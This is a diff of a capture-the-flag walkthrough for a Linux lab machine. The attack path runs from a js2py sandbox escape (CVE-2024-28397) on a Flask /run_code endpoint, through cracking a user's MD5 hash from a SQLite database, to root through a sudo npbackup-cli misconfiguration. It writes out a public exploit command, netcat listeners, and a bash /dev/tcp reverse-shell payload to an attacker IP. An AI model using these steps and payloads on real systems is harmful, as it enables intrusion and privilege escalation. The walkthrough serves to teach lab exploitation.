@@ -4,153 +4,137 @@ Difficulty: Medium
 OS: Linux
 Attack Path: Web RCE → app → marco → root
 
-## 1. Initial Enumeration
+# 1. Initial Enumeration
 Port Scan
+```
 nmap -sC -sV -p- 10.10.11.82
+```
 
 
 Relevant Results
 
-8000/tcp – Flask web application
+8000/tcp — Flask web application
 
 ## 2. Web Application Analysis (Port 8000)
 
-Browsing http://10.10.11.82:8000 revealed a Flask application that allows users to execute JavaScript code via a /run_code endpoint.
+Browsing http://10.10.11.82:8000 revealed a Flask application that allows users to execute JavaScript code via the /run_code endpoint.
 
-Source code inspection revealed the use of js2py:
+Application logic showed the use of js2py:
 
 import js2py
 js2py.disable_pyimport()
 
 
-Despite attempted sandboxing, the js2py version in use is vulnerable to a sandbox escape.
+Despite attempted sandboxing, the js2py version in use is vulnerable.
 
 ## 3. Initial Foothold — js2py Sandbox Escape
 Vulnerability
 
-CVE-2024-28397 — js2py sandbox escape leading to RCE
+CVE-2024-28397 — js2py sandbox escape leading to remote code execution
 
 Exploit Used
 
 🔗 https://github.com/naclapor/CVE-2024-28397
 
-Using the public PoC, arbitrary command execution was achieved through the /run_code endpoint, resulting in a reverse shell.
+Exploit Execution (Attacker)
 
-Listener (Attacker)
-
+Listener started:
 ```
 nc -lvnp 4444
 ```
 
-Result
+
+Exploit executed using the repository’s Python script:
+
+```
+python3 exploit.py --target http://10.10.11.82:8000/run_code --lhost 10.10.16.168
+```
+
+
+This returned a reverse shell.
+
 whoami
 app
 
-## 4. Shell Stabilization (User: app)
-
-The initial reverse shell was unstable. It was upgraded to a full PTY using Python.
-
-Spawn a PTY (Target)
+4. Shell Stabilization (User: app)
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Background the Shell (Attacker Terminal)
-CTRL+Z
 
-Fix Terminal Settings (Attacker)
+Attacker terminal:
+
+CTRL+Z
 stty raw -echo
 fg
 
 
-Press Enter once.
+Target terminal:
 
-Finalize Terminal (Target)
 export TERM=xterm
 stty rows 40 columns 120
 
-
-The shell is now fully interactive and stable.
-
 ## 5. Privilege Escalation — app → marco
 SQLite Credential Discovery
-
-While enumerating the application directory, a SQLite database was discovered:
-
 cd /home/app/app/instance
-ls
-users.db
-
-
-Open the database:
-
+```
 sqlite3 users.db
+```
 
-
-List tables:
-
+```
 .tables
-
-
-Extract credentials:
-
+```
+```
 SELECT username, password_hash FROM user;
+```
 
 
-This revealed an MD5 password hash for the local user marco.
+An MD5 password hash for user marco was recovered.
 
 Password Hash Cracking (Hashcat)
-
-The hash was copied to the attacker machine:
-
 echo '<md5_hash>' > hash.txt
-
-
-Cracked using Hashcat with the RockYou wordlist:
-
+```
 hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
 
 
-Using the recovered password, the user was switched:
+User switch:
 
 su marco
 
-## 6. Privilege Escalation — marco → root
+6. User Flag (User: marco)
+cd /home/marco
+cat user.txt
+
+## 7. Privilege Escalation — marco → root
 Sudo Enumeration
 sudo -l
 
-
-Result
-
 (ALL) NOPASSWD: /usr/local/bin/npbackup-cli
 
+## 8. Preparing the Backup Configuration
 
-This indicates that marco can execute npbackup-cli as root without a password.
+The default backup configuration file was located in the marco home directory.
 
-## 7. Root Exploitation — npbackup-cli Misconfiguration
-Analysis
+To avoid modifying the original file and to ensure write permissions, it was copied to /tmp:
 
-npbackup-cli is a backup utility that:
+```
+cp /home/marco/npbackup.conf /tmp/npbackup.conf
+```
 
-Runs as root via sudo
 
-Loads user-supplied configuration files
-
-Executes post_exec_commands as root
-
-Does not sanitize command execution
-
-Malicious Configuration File
-
-Create a custom config file:
+The copied configuration file was then edited:
 
 nano /tmp/npbackup.conf
 
+9. Root Exploitation — npbackup-cli Misconfiguration
 
-Insert the following payload:
-```
+The npbackup-cli utility executes post_exec_commands from the configuration file as root.
+
+The following payload was added to /tmp/npbackup.conf:
+
 post_exec_commands: [bash -c 'bash -i >& /dev/tcp/10.10.16.168/4444 0>&1']
-```
+
 Listener (Attacker)
 nc -lvnp 4444
 
@@ -158,35 +142,33 @@ Trigger Root Execution
 sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf --backup --force
 
 
-This forces execution of the backup and triggers the post-execution command.
+This forced execution of the backup job and triggered the post-execution command.
 
-## 8. Root Shell Stabilization
-
-After receiving the root shell, it was stabilized using the same Python PTY technique.
-
+## 10. Root Shell Stabilization
+```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 export TERM=xterm
 stty rows 40 columns 120
 
 
-Verify access:
+Verification:
 
 whoami
 root
 
-## 9. Root Flag
+## 11. Root Flag
 cat /root/root.txt
 
-798c61dabd6a410ce2637c198e51f61
 
-## 10. Attack Chain Summary
+## 12. Attack Chain Summary
 Web App (Port 8000)
   ↓
 CVE-2024-28397 (js2py sandbox escape)
   ↓
 Reverse shell as app
   ↓
-Python PTY stabilization
+Shell stabilization
   ↓
 SQLite credential extraction
   ↓
@@ -194,7 +176,11 @@ MD5 hash cracked with Hashcat
   ↓
 User marco
   ↓
-sudo npbackup-cli
+user.txt retrieved
+  ↓
+Copy npbackup.conf to /tmp
+  ↓
+sudo npbackup-cli with malicious config
   ↓
 post_exec_commands reverse shell
   ↓
